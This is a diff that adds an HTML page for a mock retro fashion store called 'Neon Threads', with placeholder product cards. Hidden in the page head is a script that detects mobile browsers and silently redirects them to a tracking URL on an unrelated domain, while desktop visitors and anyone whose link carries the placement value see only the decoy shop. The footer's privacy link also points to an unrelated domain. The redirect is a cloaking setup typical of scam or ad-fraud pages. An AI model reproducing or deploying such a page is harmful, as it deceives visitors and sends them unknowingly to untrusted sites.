@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Threads - Retro Futuristic Fashion</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #0ff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff00ff;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #00ff00;
+        }
+        nav {
+            background-color: #00ff00;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 20px;
+        }
+        nav ul li a {
+            color: #000;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            padding: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .product {
+            background-color: #1a1a1a;
+            border: 2px solid #0ff;
+            padding: 20px;
+            text-align: center;
+        }
+        .product img {
+            max-width: 100%;
+            height: auto;
+        }
+        footer {
+            background-color: #ff00ff;
+            color: #000;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Neon Threads</h1>
+        <p>Retro Futuristic Fashion for the Cyberpunk Soul</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Shop</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product">
+            <img src="https://placehold.co/200x200/ff00ff/000000?text=Neon+Jacket" alt="Neon Jacket">
+            <h2>Cyber Glow Jacket</h2>
+            <p>$99.99</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200/00ff00/000000?text=LED+Pants" alt="LED Pants">
+            <h2>Luminous Leggings</h2>
+            <p>$79.99</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200/0000ff/ffffff?text=Holographic+Top" alt="Holographic Top">
+            <h2>Holo-Shift Tee</h2>
+            <p>$59.99</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200/ffff00/000000?text=VR+Goggles" alt="VR Goggles">
+            <h2>Neuro-Link Visor</h2>
+            <p>$129.99</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Neon Threads. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
